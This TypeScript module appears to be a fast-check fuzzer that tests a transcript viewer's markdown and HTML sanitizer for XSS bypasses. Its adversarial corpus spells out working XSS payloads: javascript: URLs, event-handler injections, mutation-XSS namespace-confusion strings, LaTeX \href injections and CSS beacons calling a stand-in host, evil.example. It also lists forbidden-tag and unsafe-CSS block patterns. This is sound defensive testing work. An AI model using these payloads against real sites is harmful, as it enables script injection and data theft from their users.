/**
 * Property-based fuzzer for the rendered-markdown sanitization boundary.
 *
 * The viewer inserts `sanitizeRenderedHtml(renderMarkdown(text))` into the DOM
 * via `dangerouslySetInnerHTML`. Transcript fields are attacker-controlled, so
 * that boundary must never emit a script-execution or navigation vector. This
 * module generates adversarial markdown/MathJax/HTML, runs it through the real
 * pipeline, and re-parses the output the same way the browser does to detect
 * anything dangerous that survived.
 *
 * Generation and shrinking are delegated to fast-check: `inputArb` composes an
 * adversarial corpus (hand-authored MathJax/style vectors + the cure53/DOMPurify
 * payload set) into markdown/MathJax/HTML inputs, and fast-check reduces any
 * counterexample to a minimal repro. The oracle (`findXssViolations`) and the
 * pipeline runner (`evaluateInput`) are hand-written — fast-check only drives
 * the search.
 */

import fc from "fast-check";

import { CURE53_PAYLOADS } from "./cure53Corpus";
import { renderMarkdown, type MarkdownRenderer } from "./markdownRendering";
import { sanitizeRenderedHtml } from "./renderedHtmlSanitizer";

// Tags the sanitizer intends to strip; any survivor is a bypass.
const FORBIDDEN_TAGS = new Set([
  "animate",
  "animatemotion",
  "animatetransform",
  "audio",
  "base",
  "button",
  "discard",
  "embed",
  "foreignobject",
  "form",
  "iframe",
  "image",
  "img",
  "input",
  "link",
  "meta",
  "mpath",
  "object",
  "picture",
  "script",
  "select",
  "set",
  "source",
  "textarea",
  "track",
  "video",
]);

const URL_ATTRIBUTES = new Set([
  "action",
  "background",
  "formaction",
  "href",
  "poster",
  "src",
  "srcset",
  "xlink:href",
]);

const UNSAFE_CSS_PATTERN =
  /@import|behavior\s*:|binding\s*:|expression\s*\(|javascript\s*:|vbscript\s*:|url\s*\(/i;

export type FuzzMode = "markdown" | "fragment" | "html";

export interface Violation {
  kind:
    | "event-handler"
    | "forbidden-tag"
    | "dangerous-url"
    | "unsafe-style-attr"
    | "unsafe-style-element"
    | "srcdoc";
  detail: string;
}

export interface EvalResult {
  sanitized: string;
  violations: Violation[];
}

// Mirror the sanitizer's own URL normalization so the oracle judges what the
// browser would actually resolve (control chars + whitespace are ignored by
// URL parsers, so `java\tscript:` executes just like `javascript:`).
const normalizeUrl = (value: string): string =>
  Array.from(value)
    .filter((char) => {
      const code = char.charCodeAt(0);
      return code > 0x1f && code !== 0x7f && !/\s/.test(char);
    })
    .join("")
    .toLowerCase();

const isDangerousUrl = (value: string): boolean =>
  /^(?:javascript|vbscript|data):/.test(normalizeUrl(value));

/**
 * Re-parse sanitized HTML exactly as `dangerouslySetInnerHTML` does (assign to
 * `innerHTML` in an HTML context) and report every surviving XSS sink. Parsing
 * here — rather than string-matching — is what makes the oracle catch mutation
 * XSS: if the browser's reparse resurrects a handler or tag, we see it.
 */
export const findXssViolations = (html: string): Violation[] => {
  const container = document.createElement("div");
  container.innerHTML = html;

  const violations: Violation[] = [];
  for (const el of Array.from(container.querySelectorAll("*"))) {
    const tag = el.tagName.toLowerCase();

    if (FORBIDDEN_TAGS.has(tag)) {
      violations.push({ kind: "forbidden-tag", detail: tag });
    }

    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      const value = attr.value;

      if (name.startsWith("on")) {
        violations.push({ kind: "event-handler", detail: `${tag}[${name}]` });
      } else if (name === "srcdoc") {
        violations.push({ kind: "srcdoc", detail: tag });
      } else if (URL_ATTRIBUTES.has(name) && isDangerousUrl(value)) {
        violations.push({
          kind: "dangerous-url",
          detail: `${tag}[${name}]=${value.slice(0, 80)}`,
        });
      } else if (name === "style" && UNSAFE_CSS_PATTERN.test(value)) {
        violations.push({
          kind: "unsafe-style-attr",
          detail: value.slice(0, 80),
        });
      }
    }

    if (tag === "style" && UNSAFE_CSS_PATTERN.test(el.textContent ?? "")) {
      violations.push({
        kind: "unsafe-style-element",
        detail: (el.textContent ?? "").slice(0, 80),
      });
    }
  }

  return violations;
};

export const evaluateInput = (mode: FuzzMode, input: string): EvalResult => {
  let sanitized: string;
  if (mode === "html") {
    sanitized = sanitizeRenderedHtml(input);
  } else {
    const renderer: MarkdownRenderer =
      mode === "fragment" ? "fragment" : "full";
    sanitized = sanitizeRenderedHtml(renderMarkdown(input, renderer));
  }
  return { sanitized, violations: findXssViolations(sanitized) };
};

// ---------------------------------------------------------------------------
// Adversarial corpus.
// ---------------------------------------------------------------------------

// Dangerous URL values, dropped into href/src slots by wrappers.
const DANGEROUS_URLS = [
  "javascript:alert(1)",
  "jAvAsCrIpT:alert(1)",
  "java\tscript:alert(1)",
  "java\nscript:alert(1)",
  "  javascript:alert(1)",
  "\u0000javascript:alert(1)",
  "javascript&colon;alert(1)",
  "vbscript:msgbox(1)",
  "data:text/html,<script>alert(1)</script>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
];

// Fragments that are live XSS if they survive as markup.
const HTML_PAYLOADS = [
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)></svg>",
  "<svg><animate onbegin=alert(1)></svg>",
  "<a href=# onclick=alert(1)>x</a>",
  "<div onpointerover=alert(1)>x</div>",
  "<input autofocus onfocus=alert(1)>",
  "<video><source onerror=alert(1)></video>",
  "<iframe src=javascript:alert(1)></iframe>",
  "<object data=javascript:alert(1)></object>",
  "<base href=javascript:alert(1)//>",
  "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
  "<form><button formaction=javascript:alert(1)>x</button></form>",
  "<a href=x style=background:url(javascript:alert(1))>x</a>",
  // Namespace-confusion / mutation-XSS classics. The sanitizer allows <style>
  // conditionally and enables HTML+MathML+SVG profiles together — historically
  // the exact combination that reopens mXSS holes, so stress it hard.
  "<math><mtext><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>",
  "<svg><foreignObject><a href=javascript:alert(1)>x</a></foreignObject></svg>",
  "<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></mglyph></table></mtext></math>",
  '<svg></p><style><a id="</style><img src=x onerror=alert(1)>">',
  '<math><annotation-xml encoding="text/html"><iframe src=javascript:alert(1)></iframe></annotation-xml></math>',
  "<svg><foreignObject><iframe/onload=alert(1)></foreignObject></svg>",
  "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
  '<style>@import"https://evil.example/x.css";</style>',
  "<style>x{background:url(https://evil.example/beacon)}</style>",
  '<span id="mjx-deadbeef"><style>#mjx-deadbeef{background:url(https://evil.example/beacon)}</style></span>',
  '<span id="mjx-deadbeef"><style>#mjx-deadbeef{}</style><img src=x onerror=alert(1)></span>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  "<template><img src=x onerror=alert(1)></template>",
  "<xmp><img src=x onerror=alert(1)></xmp>",
  "<listing><img src=x onerror=alert(1)></listing>",
  "<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></svg>",
  "<svg><title><style><a xlink:href=javascript:alert(1)></style></title></svg>",
];

// LaTeX/MathJax payloads. `URL` is substituted with a dangerous URL.
const LATEX_PAYLOADS = [
  "\\href{URL}{z}",
  '\\href{x"><animate onbegin=alert(1)>}{z}',
  '\\href{x" onmouseover="alert(1)}{z}',
  "\\href{URL}{\\text{click}}",
  "\\class{c}{\\href{URL}{z}}",
  "\\cssId{i}{\\href{URL}{z}}",
  "\\style{background:url(URL)}{z}",
  "\\unicode{x41}\\href{URL}{z}",
];

// Entity-encoded payloads that target the pipeline's post-render unescaping
// (unescapeCodeHtmlEntities / unescapeSupHtmlEntities / unprotectMarkdown).
const ENTITY_PAYLOADS = [
  "&lt;img src=x onerror=alert(1)&gt;",
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "&#60;svg onload=alert(1)&#62;",
  "&#x3c;img src=x onerror=alert(1)&#x3e;",
  "&lt;sup&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/sup&gt;",
];

// Sequences that break out of attribute/tag contexts.
const BREAKOUTS = [
  '">',
  "'>",
  '"><',
  "</",
  "<!--",
  "-->",
  "<![CDATA[",
  "]]>",
  "\u0000",
  "`",
  "&NewLine;",
  "&Tab;",
  "&colon;",
  "&#0;",
];

// LaTeX/MathJax templates. `URL` is substituted with a dangerous URL.
const LATEX_TEMPLATES = LATEX_PAYLOADS;

// Named markdown/HTML wrappers. "none" is first so fast-check shrinks toward
// the bare payload.
const WRAPPERS: ReadonlyArray<{
  name: string;
  apply: (fragment: string) => string;
}> = [
  { name: "none", apply: (f) => f },
  { name: "inline-math", apply: (f) => `$${f}$` },
  { name: "block-math", apply: (f) => `$$${f}$$` },
  { name: "md-link", apply: (f) => `[link](${f})` },
  { name: "md-image", apply: (f) => `![alt](${f})` },
  { name: "inline-code", apply: (f) => `\`${f}\`` },
  { name: "fenced-code", apply: (f) => `\n\n\`\`\`\n${f}\n\`\`\`\n\n` },
  { name: "html-code", apply: (f) => `<code>${f}</code>` },
  { name: "html-sup", apply: (f) => `<sup>${f}</sup>` },
  { name: "blockquote", apply: (f) => `> ${f}` },
  { name: "list-item", apply: (f) => `- ${f}` },
  { name: "ref-def", apply: (f) => `[ref]: ${f}` },
];

// ---------------------------------------------------------------------------
// fast-check arbitraries. A fragment is a corpus payload, optionally wrapped in
// a markdown/HTML context, optionally upper-cased, optionally spliced with a
// context-breakout sequence. An input is 1-4 fragments joined under one mode.
// fast-check shrinks the record fields (fewer fragments, "none" wrapper, no
// breakout, earlier corpus entries), yielding clean minimal repros for free.
// ---------------------------------------------------------------------------

const dangerousUrlArb = fc.constantFrom(...DANGEROUS_URLS);

const payloadArb: fc.Arbitrary<string> = fc.oneof(
  fc.constantFrom(...CURE53_PAYLOADS),
  fc.constantFrom(...HTML_PAYLOADS),
  fc.constantFrom(...ENTITY_PAYLOADS),
  dangerousUrlArb,
  fc
    .tuple(fc.constantFrom(...LATEX_TEMPLATES), dangerousUrlArb)
    .map(([template, url]) => template.replace(/URL/g, url))
);

const fragmentArb: fc.Arbitrary<string> = fc
  .record({
    payload: payloadArb,
    wrapper: fc.constantFrom(...WRAPPERS),
    upper: fc.boolean(),
    breakout: fc.option(fc.constantFrom(...BREAKOUTS), { nil: undefined }),
    breakoutPos: fc.nat(),
  })
  .map(({ payload, wrapper, upper, breakout, breakoutPos }) => {
    let fragment = wrapper.apply(payload);
    if (upper) {
      fragment = fragment.toUpperCase();
    }
    if (breakout !== undefined) {
      const at = breakoutPos % (fragment.length + 1);
      fragment = fragment.slice(0, at) + breakout + fragment.slice(at);
    }
    return fragment;
  });

export interface FuzzInput {
  mode: FuzzMode;
  input: string;
}

export const inputArb: fc.Arbitrary<FuzzInput> = fc
  .record({
    mode: fc.constantFrom<FuzzMode>("markdown", "fragment", "html"),
    fragments: fc.array(fragmentArb, { minLength: 1, maxLength: 4 }),
    separator: fc.constantFrom("\n\n", "\n", " ", ""),
  })
  .map(({ mode, fragments, separator }) => ({
    mode,
    input: fragments.join(mode === "html" ? "" : separator),
  }));

// ---------------------------------------------------------------------------
// Classification + property. A finding is either an XSS bypass (something
// dangerous survived) or a thrown exception. `sanitizeRenderedHtml` feeds
// `dangerouslySetInnerHTML`, so a throw is itself a defect: it becomes a render
// crash / failed-to-display rather than safe output.
// ---------------------------------------------------------------------------

export type FindingKind = "ok" | "xss" | "sanitizer-threw";

export interface Classification {
  kind: FindingKind;
  violations: Violation[];
  sanitized?: string;
  error?: string;
}

export const classify = (mode: FuzzMode, input: string): Classification => {
  let sanitized: string;
  try {
    sanitized = evaluateInput(mode, input).sanitized;
  } catch (e) {
    return {
      kind: "sanitizer-threw",
      violations: [],
      error: e instanceof Error ? e.message : String(e),
    };
  }
  const violations = findXssViolations(sanitized);
  return {
    kind: violations.length ? "xss" : "ok",
    violations,
    sanitized,
  };
};

// The already-documented DOMPurify double-remove throw (see the fuzz test's
// `it.fails`). Tolerated here so the property surfaces only *new* findings; a
// throw with any other message still fails.
export const KNOWN_ISSUE_THROW = /refusing to sanitize in place/;

/**
 * fast-check property predicate. Throws (fails the run) on any new finding — an
 * XSS bypass, or a sanitizer throw other than the known DOMPurify one — with a
 * message that carries the minimal repro fast-check shrank to.
 */
export const assertNoNewFinding = ({ mode, input }: FuzzInput): void => {
  const result = classify(mode, input);
  if (result.kind === "sanitizer-threw") {
    if (result.error && KNOWN_ISSUE_THROW.test(result.error)) {
      return;
    }
    throw new Error(
      `sanitizer threw (${mode}): ${result.error}\n  input: ${JSON.stringify(input)}`
    );
  }
  if (result.kind === "xss") {
    throw new Error(
      `XSS bypass (${mode}): ` +
        result.violations.map((v) => `${v.kind}:${v.detail}`).join(", ") +
        `\n  input: ${JSON.stringify(input)}` +
        `\n  sanitized: ${JSON.stringify(result.sanitized)}`
    );
  }
};
